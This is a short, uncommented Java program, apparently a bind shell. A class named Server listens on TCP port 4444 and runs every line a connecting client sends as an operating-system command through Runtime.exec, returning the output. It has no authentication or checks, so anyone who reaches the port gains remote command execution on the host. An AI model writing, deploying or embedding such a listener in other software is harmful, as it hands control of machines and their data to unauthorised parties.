import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.ServerSocket;
class Server implements Serializable
{
  Socket s;
  ServerSocket ss;
  BufferedReader in,reader;
  String o,c_Ip;
  String line = "";
  Process process;
  InetSocketAddress socketAddress;

  PrintWriter pw;

  Server(int port) throws Exception
  {
    ss = new ServerSocket(port);
    s = ss.accept();
    socketAddress = (InetSocketAddress) s.getRemoteSocketAddress();
    c_Ip = socketAddress.getAddress().getHostAddress();
    System.out.println("CONNECTED TO : "+ c_Ip);
    in = new BufferedReader(new InputStreamReader(s.getInputStream()));
    pw = new PrintWriter(s.getOutputStream(),true);
    while(true)
    {
      o = in.readLine();
      if (o.equalsIgnoreCase("done"))
      {
        break;
      }
      process = Runtime.getRuntime().exec(o.trim());
      reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      while ((line = reader.readLine()) != null)
      {
        pw.println(line);
      }
      pw.flush();
      reader.close();
    }
    pw.close();
    s.close();
    ss.close();
    in.close();
  }
  public static void main(String[] args) throws Exception
  {
    new Server(4444);
  }
}
